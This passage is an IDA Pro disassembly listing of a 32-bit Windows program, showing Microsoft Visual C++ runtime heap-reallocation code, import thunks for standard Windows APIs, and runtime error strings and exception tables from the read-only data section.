; [0000011E BYTES: COLLAPSED FUNCTION ___crtGetLocaleInfoA. PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [00000068 BYTES: COLLAPSED FUNCTION __aulldiv. PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [00000075 BYTES: COLLAPSED FUNCTION __aullrem. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000008 BYTES: COLLAPSED FUNCTION __tolower. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000006F BYTES: COLLAPSED FUNCTION _tolower.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000CB BYTES: COLLAPSED FUNCTION _tolower_0. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
		align 10h
; [00000034 BYTES: COLLAPSED FUNCTION __allmul.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
		push	esi
		push	0Ch
		call	__lock
		push	dword ptr [esp+0Ch]
		call	_getenv
		push	0Ch
		mov	esi, eax
		call	__unlock
		add	esp, 0Ch
		mov	eax, esi
		pop	esi
		retn
; [0000007D BYTES: COLLAPSED FUNCTION _getenv. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [0000003F BYTES: COLLAPSED FUNCTION __mbsnbicoll. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000006E BYTES: COLLAPSED FUNCTION ___wtomb_environ.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000027D BYTES: COLLAPSED FUNCTION ___crtCompareStringA. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION _strncnt_0. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [00000187 BYTES: COLLAPSED FUNCTION ___crtsetenv. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000058 BYTES: COLLAPSED FUNCTION _findenv.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000067 BYTES: COLLAPSED FUNCTION _copy_environ. PRESS KEYPAD CTRL-"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_40BBAD(LPVOID	lpMem, SIZE_T dwBytes)
sub_40BBAD	proc near		; CODE XREF: ___crtsetenv+EDp
					; ___crtsetenv+115p

var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
ms_exc		= CPPEH_RECORD ptr -18h
lpMem		= dword	ptr  8
dwBytes		= dword	ptr  0Ch

; FUNCTION CHUNK AT 0040BD41 SIZE 0000019B BYTES

		push	ebp
		mov	ebp, esp
		push	0FFFFFFFFh
		push	offset stru_411D08
		push	offset __except_handler3
		mov	eax, large fs:0
		push	eax
		mov	large fs:0, esp
		sub	esp, 28h
		push	ebx
		push	esi
		push	edi
		mov	ebx, [ebp+lpMem]
		xor	edi, edi
		cmp	ebx, edi
		jnz	short loc_40BBE7
		push	[ebp+dwBytes]	; size_t
		call	_malloc
		pop	ecx
		jmp	loc_40BECD
; ---------------------------------------------------------------------------

loc_40BBE7:				; CODE XREF: sub_40BBAD+2Aj
		mov	esi, [ebp+dwBytes]
		cmp	esi, edi
		jnz	short loc_40BBFA
		push	ebx		; lpMem
		call	sub_402821
		pop	ecx
		jmp	loc_40BECB
; ---------------------------------------------------------------------------

loc_40BBFA:				; CODE XREF: sub_40BBAD+3Fj
		mov	eax, dword_43DBA8
		cmp	eax, 3
		jnz	loc_40BD41

loc_40BC08:				; CODE XREF: sub_40BBAD+178j
		mov	[ebp+var_24], edi
		cmp	esi, 0FFFFFFE0h
		ja	loc_40BD05
		push	9
		call	__lock
		pop	ecx
		mov	[ebp+ms_exc.registration.TryLevel], edi
		push	ebx
		call	___sbh_find_block
		pop	ecx
		mov	[ebp+var_28], eax
		cmp	eax, edi
		jz	loc_40BCD5
		cmp	esi, dword_43DB94
		ja	short loc_40BC85
		push	esi
		push	ebx
		push	eax
		call	___sbh_resize_block
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_40BC4D
		mov	[ebp+var_24], ebx
		jmp	short loc_40BC85
; ---------------------------------------------------------------------------

loc_40BC4D:				; CODE XREF: sub_40BBAD+99j
		push	esi
		call	___sbh_alloc_block
		pop	ecx
		mov	[ebp+var_24], eax
		cmp	eax, edi
		jz	short loc_40BC85
		mov	eax, [ebx-4]
		dec	eax
		mov	[ebp+var_20], eax
		cmp	eax, esi
		jb	short loc_40BC68
		mov	eax, esi

loc_40BC68:				; CODE XREF: sub_40BBAD+B7j
		push	eax		; size_t
		push	ebx		; void *
		push	[ebp+var_24]	; void *
		call	_memcpy_0
		push	ebx
		call	___sbh_find_block
		mov	[ebp+var_28], eax
		push	ebx
		push	eax
		call	sub_4043DB
		add	esp, 18h

loc_40BC85:				; CODE XREF: sub_40BBAD+8Aj
					; sub_40BBAD+9Ej ...
		cmp	[ebp+var_24], edi
		jnz	short loc_40BCD5
		cmp	esi, edi
		jnz	short loc_40BC94
		push	1
		pop	esi
		mov	[ebp+dwBytes], esi

loc_40BC94:				; CODE XREF: sub_40BBAD+DFj
		add	esi, 0Fh
		and	esi, 0FFFFFFF0h
		mov	[ebp+dwBytes], esi
		push	esi		; dwBytes
		push	edi		; dwFlags
		push	hHeap		; hHeap
		call	ds:HeapAlloc
		mov	[ebp+var_24], eax
		cmp	eax, edi
		jz	short loc_40BCD5
		mov	eax, [ebx-4]
		dec	eax
		mov	[ebp+var_20], eax
		cmp	eax, esi
		jb	short loc_40BCBF
		mov	eax, esi

loc_40BCBF:				; CODE XREF: sub_40BBAD+10Ej
		push	eax		; size_t
		push	ebx		; void *
		push	[ebp+var_24]	; void *
		call	_memcpy_0
		push	ebx
		push	[ebp+var_28]
		call	sub_4043DB
		add	esp, 14h

loc_40BCD5:				; CODE XREF: sub_40BBAD+7Ej
					; sub_40BBAD+DBj ...
		or	[ebp+ms_exc.registration.TryLevel], 0FFFFFFFFh
		call	loc_40BD38
; ---------------------------------------------------------------------------

loc_40BCDE:				; CODE XREF: sub_40BBAD+193j
		cmp	[ebp+var_28], edi
		jnz	short loc_40BD05
		cmp	esi, edi
		jnz	short loc_40BCEA
		push	1
		pop	esi

loc_40BCEA:				; CODE XREF: sub_40BBAD+138j
		add	esi, 0Fh
		and	esi, 0FFFFFFF0h
		mov	[ebp+dwBytes], esi
		push	esi		; dwBytes
		push	ebx		; lpMem
		push	edi		; dwFlags
		push	hHeap		; hHeap
		call	ds:HeapReAlloc
		mov	[ebp+var_24], eax

loc_40BD05:				; CODE XREF: sub_40BBAD+61j
					; sub_40BBAD+134j
		mov	eax, [ebp+var_24]
		cmp	eax, edi
		jnz	loc_40BECD
		cmp	dword_43D6A4, edi
		jz	loc_40BECD
		push	esi
		call	__callnewh
		pop	ecx
		test	eax, eax
		jnz	loc_40BC08
		jmp	loc_40BECB
; ---------------------------------------------------------------------------

loc_40BD30:				; DATA XREF: .rdata:stru_411D08o
		mov	esi, [ebp+dwBytes] ; Finally handler 0 for function 40BBAD
		mov	ebx, [ebp+lpMem]
		xor	edi, edi

loc_40BD38:				; CODE XREF: sub_40BBAD+12Cj
		push	9
		call	__unlock
		pop	ecx
		retn
sub_40BBAD	endp

; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_40BBAD

loc_40BD41:				; CODE XREF: sub_40BBAD+55j
		cmp	eax, 2
		jnz	loc_40BE91
		cmp	esi, 0FFFFFFE0h
		ja	short loc_40BD61
		cmp	esi, edi
		jbe	short loc_40BD5B
		add	esi, 0Fh
		and	esi, 0FFFFFFF0h
		jmp	short loc_40BD5E
; ---------------------------------------------------------------------------

loc_40BD5B:				; CODE XREF: sub_40BBAD+1A4j
		push	10h
		pop	esi

loc_40BD5E:				; CODE XREF: sub_40BBAD+1ACj
		mov	[ebp+dwBytes], esi

loc_40BD61:				; CODE XREF: sub_40BBAD+1A0j
					; sub_40BBAD+2CBj
		mov	[ebp+var_24], edi
		cmp	esi, 0FFFFFFE0h
		ja	loc_40BE60
		push	9
		call	__lock
		pop	ecx
		mov	[ebp+ms_exc.registration.TryLevel], 1
		lea	eax, [ebp+var_2C]
		push	eax
		lea	eax, [ebp+var_38]
		push	eax
		push	ebx
		call	sub_40552D
		add	esp, 0Ch
		mov	edi, eax
		mov	[ebp+var_30], edi
		test	edi, edi
		jz	loc_40BE44
		cmp	esi, dword_43BA0C
		jnb	short loc_40BDFE
		mov	ebx, esi
		shr	ebx, 4
		push	ebx
		push	edi
		push	[ebp+var_2C]
		push	[ebp+var_38]
		call	sub_4058F5
		add	esp, 10h
		test	eax, eax
		jz	short loc_40BDC3
		mov	eax, [ebp+lpMem]
		mov	[ebp+var_24], eax
		jmp	short loc_40BDFB
; ---------------------------------------------------------------------------

loc_40BDC3:				; CODE XREF: sub_40BBAD+20Cj
		push	ebx
		call	sub_4055C9
		pop	ecx
		mov	[ebp+var_24], eax
		test	eax, eax
		jz	short loc_40BDFB
		movzx	eax, byte ptr [edi]
		shl	eax, 4
		mov	[ebp+var_34], eax
		cmp	eax, esi
		jb	short loc_40BDE0
		mov	eax, esi

loc_40BDE0:				; CODE XREF: sub_40BBAD+22Fj
		push	eax		; size_t
		push	[ebp+lpMem]	; void *
		push	[ebp+var_24]	; void *
		call	_memcpy_0
		push	edi
		push	[ebp+var_2C]
		push	[ebp+var_38]
		call	sub_405584
		add	esp, 18h

loc_40BDFB:				; CODE XREF: sub_40BBAD+214j
					; sub_40BBAD+222j
		mov	ebx, [ebp+lpMem]

loc_40BDFE:				; CODE XREF: sub_40BBAD+1F3j
		cmp	[ebp+var_24], 0
		jnz	short loc_40BE57
		push	esi		; dwBytes
		push	0		; dwFlags
		push	hHeap		; hHeap
		call	ds:HeapAlloc
		mov	[ebp+var_24], eax
		test	eax, eax
		jz	short loc_40BE57
		movzx	eax, byte ptr [edi]
		shl	eax, 4
		mov	[ebp+var_34], eax
		cmp	eax, esi
		jb	short loc_40BE29
		mov	eax, esi

loc_40BE29:				; CODE XREF: sub_40BBAD+278j
		push	eax		; size_t
		push	ebx		; void *
		push	[ebp+var_24]	; void *
		call	_memcpy_0
		push	edi
		push	[ebp+var_2C]
		push	[ebp+var_38]
		call	sub_405584
		add	esp, 18h
		jmp	short loc_40BE57
; ---------------------------------------------------------------------------

loc_40BE44:				; CODE XREF: sub_40BBAD+1E7j
		push	esi		; dwBytes
		push	ebx		; lpMem
		push	0		; dwFlags
		push	hHeap		; hHeap
		call	ds:HeapReAlloc
		mov	[ebp+var_24], eax

loc_40BE57:				; CODE XREF: sub_40BBAD+255j
					; sub_40BBAD+26Bj ...
		or	[ebp+ms_exc.registration.TryLevel], 0FFFFFFFFh
		call	loc_40BE86
; ---------------------------------------------------------------------------

loc_40BE60:				; CODE XREF: sub_40BBAD+1BAj
					; sub_40BBAD+2E3j
		mov	eax, [ebp+var_24]
		cmp	eax, edi
		jnz	short loc_40BECD
		cmp	dword_43D6A4, edi
		jz	short loc_40BECD
		push	esi
		call	__callnewh
		pop	ecx
		test	eax, eax
		jnz	loc_40BD61
		jmp	short loc_40BECB
; ---------------------------------------------------------------------------

loc_40BE80:				; DATA XREF: .rdata:stru_411D08o
		mov	esi, [ebp+dwBytes] ; Finally handler 1 for function 40BBAD
		mov	ebx, [ebp+lpMem]

loc_40BE86:				; CODE XREF: sub_40BBAD+2AEj
		push	9
		call	__unlock
		pop	ecx
		xor	edi, edi
		retn
; ---------------------------------------------------------------------------

loc_40BE91:				; CODE XREF: sub_40BBAD+197j
					; sub_40BBAD+31Cj
		xor	eax, eax
		cmp	esi, 0FFFFFFE0h
		ja	short loc_40BEB4
		cmp	esi, edi
		jnz	short loc_40BE9F
		push	1
		pop	esi

loc_40BE9F:				; CODE XREF: sub_40BBAD+2EDj
		add	esi, 0Fh
		and	esi, 0FFFFFFF0h
		push	esi		; dwBytes
		push	ebx		; lpMem
		push	edi		; dwFlags
		push	hHeap		; hHeap
		call	ds:HeapReAlloc

loc_40BEB4:				; CODE XREF: sub_40BBAD+2E9j
		cmp	eax, edi
		jnz	short loc_40BECD
		cmp	dword_43D6A4, edi
		jz	short loc_40BECD
		push	esi
		call	__callnewh
		pop	ecx
		test	eax, eax
		jnz	short loc_40BE91

loc_40BECB:				; CODE XREF: sub_40BBAD+48j
					; sub_40BBAD+17Ej ...
		xor	eax, eax

loc_40BECD:				; CODE XREF: sub_40BBAD+35j
					; sub_40BBAD+15Dj ...
		mov	ecx, [ebp+ms_exc.registration.Next]
		mov	large fs:0, ecx
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; END OF FUNCTION CHUNK	FOR sub_40BBAD
; [00000097 BYTES: COLLAPSED FUNCTION __mbschr.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION __strdup.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION RtlUnwind. PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
		jmp	ds:GetStartupInfoA
; ---------------------------------------------------------------------------
		jmp	ds:GetCommandLineA
; ---------------------------------------------------------------------------
		jmp	ds:GetVersion
; ---------------------------------------------------------------------------
		jmp	ds:ExitProcess
; ---------------------------------------------------------------------------
		jmp	ds:HeapAlloc
; ---------------------------------------------------------------------------
		jmp	ds:HeapFree
; ---------------------------------------------------------------------------
		jmp	ds:GetCurrentThreadId
; ---------------------------------------------------------------------------
		jmp	ds:TlsSetValue
; ---------------------------------------------------------------------------
		jmp	ds:TlsAlloc
; ---------------------------------------------------------------------------
		jmp	ds:TlsFree
; ---------------------------------------------------------------------------
		jmp	ds:SetLastError
; ---------------------------------------------------------------------------
		jmp	ds:TlsGetValue
; ---------------------------------------------------------------------------
		jmp	ds:GetLastError
; ---------------------------------------------------------------------------
		jmp	ds:GetCurrentThread
; ---------------------------------------------------------------------------
		jmp	ds:TerminateProcess
; ---------------------------------------------------------------------------
		jmp	ds:GetCurrentProcess
; ---------------------------------------------------------------------------
		jmp	ds:UnhandledExceptionFilter
; ---------------------------------------------------------------------------
		jmp	ds:GetModuleFileNameA
; ---------------------------------------------------------------------------
		jmp	ds:FreeEnvironmentStringsA
; ---------------------------------------------------------------------------
		jmp	ds:FreeEnvironmentStringsW
; ---------------------------------------------------------------------------
		jmp	ds:WideCharToMultiByte
; ---------------------------------------------------------------------------
		jmp	ds:GetEnvironmentStrings
; ---------------------------------------------------------------------------
		jmp	ds:GetEnvironmentStringsW
; ---------------------------------------------------------------------------
		jmp	ds:SetHandleCount
; ---------------------------------------------------------------------------
		jmp	ds:GetStdHandle
; ---------------------------------------------------------------------------
		jmp	ds:GetFileType
; ---------------------------------------------------------------------------
		jmp	ds:DeleteCriticalSection
; ---------------------------------------------------------------------------
		jmp	ds:GetEnvironmentVariableA
; ---------------------------------------------------------------------------
		jmp	ds:GetVersionExA
; ---------------------------------------------------------------------------
		jmp	ds:HeapDestroy
; ---------------------------------------------------------------------------
		jmp	ds:HeapCreate
; ---------------------------------------------------------------------------
		jmp	ds:WriteFile
; ---------------------------------------------------------------------------
		jmp	ds:HeapReAlloc
; ---------------------------------------------------------------------------
		jmp	ds:IsBadWritePtr
; ---------------------------------------------------------------------------
		jmp	ds:InitializeCriticalSection
; ---------------------------------------------------------------------------
		jmp	ds:EnterCriticalSection
; ---------------------------------------------------------------------------
		jmp	ds:LeaveCriticalSection
; ---------------------------------------------------------------------------
		jmp	ds:FatalAppExitA
; ---------------------------------------------------------------------------
		jmp	ds:SetUnhandledExceptionFilter
; ---------------------------------------------------------------------------
		jmp	ds:IsBadReadPtr
; ---------------------------------------------------------------------------
		jmp	ds:IsBadCodePtr
; ---------------------------------------------------------------------------
		jmp	ds:GetCPInfo
; ---------------------------------------------------------------------------
		jmp	ds:GetACP
; ---------------------------------------------------------------------------
		jmp	ds:GetOEMCP
; ---------------------------------------------------------------------------
		jmp	ds:SetConsoleCtrlHandler
; ---------------------------------------------------------------------------
		jmp	ds:MultiByteToWideChar
; ---------------------------------------------------------------------------
		jmp	ds:LCMapStringA
; ---------------------------------------------------------------------------
		jmp	ds:LCMapStringW
; ---------------------------------------------------------------------------
		jmp	ds:GetStringTypeA
; ---------------------------------------------------------------------------
		jmp	ds:GetStringTypeW
; ---------------------------------------------------------------------------
		jmp	ds:InterlockedDecrement
; ---------------------------------------------------------------------------
		jmp	ds:InterlockedIncrement
; ---------------------------------------------------------------------------
		jmp	ds:IsValidLocale
; ---------------------------------------------------------------------------
		jmp	ds:IsValidCodePage
; ---------------------------------------------------------------------------
		jmp	ds:GetLocaleInfoA
; ---------------------------------------------------------------------------
		jmp	ds:EnumSystemLocalesA
; ---------------------------------------------------------------------------
		jmp	ds:GetUserDefaultLCID
; ---------------------------------------------------------------------------
		jmp	ds:GetTimeZoneInformation
; ---------------------------------------------------------------------------
		jmp	ds:GetLocaleInfoW
; ---------------------------------------------------------------------------
		jmp	ds:CompareStringA
; ---------------------------------------------------------------------------
		jmp	ds:CompareStringW
; ---------------------------------------------------------------------------
		jmp	ds:SetEnvironmentVariableA
; ---------------------------------------------------------------------------
		db 37D8h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


sub_40F8F0	proc near		; DATA XREF: .rdata:stru_4120C0o
		lea	ecx, [ebp-24h]
		jmp	sub_401028
sub_40F8F0	endp

; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_4. PRESS KEYPAD CTRL-"+" TO EXPAND]
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
		db 'ллллл',0
		align 800h
_text		ends

; Section 2. (virtual address 00011000)
; Virtual size			: 0000133C (   4924.)
; Section size in file		: 00002000 (   8192.)
; Offset to raw	data for section: 00011000
; Flags	40000040: Data Readable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 411000h
stru_411000	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_40267F, offset loc_402693>
					; DATA XREF: start+5o
					; SEH scope table for function 402596
		align 10h
stru_411010	_SCOPETABLE_ENTRY <0FFFFFFFFh, 0, offset loc_40278C>
					; DATA XREF: sub_402725+5o
		_SCOPETABLE_ENTRY <0FFFFFFFFh, 0, offset loc_4027E8> ; SEH scope table for function 402725
stru_411028	_SCOPETABLE_ENTRY <0FFFFFFFFh, 0, offset loc_40288B>
					; DATA XREF: sub_402821+5o
		_SCOPETABLE_ENTRY <0FFFFFFFFh, 0, offset loc_4028E3> ; SEH scope table for function 402821
stru_411040	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_402CC6, offset loc_402CD0>
					; DATA XREF: ___FrameUnwindToState+5o
					; SEH scope table for function 402C5F
		align 10h
stru_411050	_SCOPETABLE_ENTRY <0FFFFFFFFh, 0, offset loc_402E55>
					; DATA XREF: CallCatchBlock(EHExceptionRecord *,EHRegistrationNode *,_CONTEXT *,_s_FuncInfo const *,void *,int,ulong)+5o
		_SCOPETABLE_ENTRY <0, offset loc_402E33, offset	loc_402E3D> ; SEH scope	table for function 402D8E
stru_411068	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_40308B, offset loc_40308F>
					; DATA XREF: BuildCatchObject(EHExceptionRecord	*,EHRegistrationNode *,_s_HandlerType const *,_s_CatchableType const *)+5o
					; SEH scope table for function 402ED3
		align 8
stru_411078	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_4030ED, offset loc_4030F6>
					; DATA XREF: unknown_libname_2+5o
					; SEH scope table for function 403097
		align 8
stru_411088	_SCOPETABLE_ENTRY <0FFFFFFFFh, 0, offset loc_403370>
					; DATA XREF: terminate(void)+5o
		_SCOPETABLE_ENTRY <0, offset loc_40335C, offset	loc_403360> ; SEH scope	table for function 403314
stru_4110A0	_SCOPETABLE_ENTRY <0FFFFFFFFh, 0, offset loc_4033DE>
					; DATA XREF: sub_40338D+5o
		_SCOPETABLE_ENTRY <0, offset loc_4033CA, offset	loc_4033CE> ; SEH scope	table for function 40338D
; char a__global_heap_[]
a__global_heap_	db '__GLOBAL_HEAP_SELECTED',0 ; DATA XREF: sub_403D66+8Eo
		align 10h
; CHAR Name[]
Name		db '__MSVCRT_HEAP_SELECT',0 ; DATA XREF: sub_403D66+4Fo
		align 4
aRuntimeError	db 'runtime error ',0   ; DATA XREF: .data:004399E4o
		align 4
asc_4110F8	db 0Dh,0Ah,0		; DATA XREF: .data:004399DCo
		align 4
aTlossError	db 'TLOSS error',0Dh,0Ah,0 ; DATA XREF: .data:004399D4o
		align 4
aSingError	db 'SING error',0Dh,0Ah,0 ; DATA XREF: .data:004399CCo
		align 4
aDomainError	db 'DOMAIN error',0Dh,0Ah,0 ; DATA XREF: .data:004399C4o
		align 4
aR6028UnableToI	db 'R6028',0Dh,0Ah      ; DATA XREF: .data:004399BCo
		db '- unable to initialize heap',0Dh,0Ah,0
		align 4
aR6027NotEnough	db 'R6027',0Dh,0Ah      ; DATA XREF: .data:004399B4o
		db '- not enough space for lowio initialization',0Dh,0Ah,0
		align 4
aR6026NotEnough	db 'R6026',0Dh,0Ah      ; DATA XREF: .data:004399ACo
		db '- not enough space for stdio initialization',0Dh,0Ah,0
		align 4
aR6025PureVirtu	db 'R6025',0Dh,0Ah      ; DATA XREF: .data:004399A4o
		db '- pure virtual function call',0Dh,0Ah,0
		align 4
aR6024NotEnough	db 'R6024',0Dh,0Ah      ; DATA XREF: .data:0043999Co
		db '- not enough space for _onexit/atexit table',0Dh,0Ah,0
		align 4
aR6019UnableToO	db 'R6019',0Dh,0Ah      ; DATA XREF: .data:00439994o
		db '- unable to open console device',0Dh,0Ah,0
		align 10h
aR6018Unexpecte	db 'R6018',0Dh,0Ah      ; DATA XREF: .data:0043998Co
		db '- unexpected heap error',0Dh,0Ah,0
		align 4
aR6017Unexpecte	db 'R6017',0Dh,0Ah      ; DATA XREF: .data:00439984o
		db '- unexpected multithread lock error',0Dh,0Ah,0
		align 4
aR6016NotEnough	db 'R6016',0Dh,0Ah      ; DATA XREF: .data:0043997Co
		db '- not enough space for thread data',0Dh,0Ah,0
aAbnormalProgra	db 0Dh,0Ah		; DATA XREF: .data:00439974o
		db 'abnormal program termination',0Dh,0Ah,0
		align 4
aR6009NotEnough	db 'R6009',0Dh,0Ah      ; DATA XREF: .data:0043996Co
		db '- not enough space for environment',0Dh,0Ah,0
aR6008NotEnough	db 'R6008',0Dh,0Ah      ; DATA XREF: .data:00439964o
		db '- not enough space for arguments',0Dh,0Ah,0
		align 4
aR6002FloatingP	db 'R6002',0Dh,0Ah      ; DATA XREF: .data:off_43995Co
		db '- floating point not loaded',0Dh,0Ah,0
		align 4
aMicrosoftVisua	db 'Microsoft Visual C++ Runtime Library',0 ; DATA XREF: sub_4040CD+119o
		align 4
; char asc_41139C[]
asc_41139C	db 0Ah			; DATA XREF: sub_4040CD+F1o
		db 0Ah,0
		align 10h
; char aRuntimeErrorPr[]
aRuntimeErrorPr	db 'Runtime Error!',0Ah ; DATA XREF: sub_4040CD+D3o
		db 0Ah
		db 'Program: ',0
		align 4
; char a___[]
a___		db '...',0              ; DATA XREF: sub_4040CD+BFo
; char aProgramNameUnk[]
aProgramNameUnk	db '<program name unknown>',0 ; DATA XREF: sub_4040CD+7Do
		align 4
stru_4113D8	_SCOPETABLE_ENTRY <0FFFFFFFFh, 0, offset loc_406139>
					; DATA XREF: sub_4060A5+5o
		_SCOPETABLE_ENTRY <0FFFFFFFFh, 0, offset loc_4061C2> ; SEH scope table for function 4060A5
; CHAR aGetlastactivep[]
aGetlastactivep	db 'GetLastActivePopup',0 ; DATA XREF: ___crtMessageBoxA+3Do
		align 4
; CHAR aGetactivewindo[]
aGetactivewindo	db 'GetActiveWindow',0  ; DATA XREF: ___crtMessageBoxA+35o
; CHAR ProcName[]
ProcName	db 'MessageBoxA',0      ; DATA XREF: ___crtMessageBoxA+24o
; CHAR LibFileName[]
LibFileName	db 'user32.dll',0       ; DATA XREF: ___crtMessageBoxA+Do
		align 4
; CHAR String1[4]
String1		db 4 dup(0)		; DATA XREF: ___crtLCMapStringA+57o
					; ___crtGetStringTypeA+52o ...
; const	WCHAR String2
String2		dw 0			; DATA XREF: ___crtLCMapStringA+36o
					; ___crtGetStringTypeA+39o ...
		align 8
stru_411438	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_40765D, offset loc_407661>
					; DATA XREF: ___crtLCMapStringA+5o
		_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_407711, offset loc_407715> ; SEH scope table for function 40754D
stru_411450	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_407895, offset loc_407899>
					; DATA XREF: ___crtGetStringTypeA+5o
					; SEH scope table for function 40779C
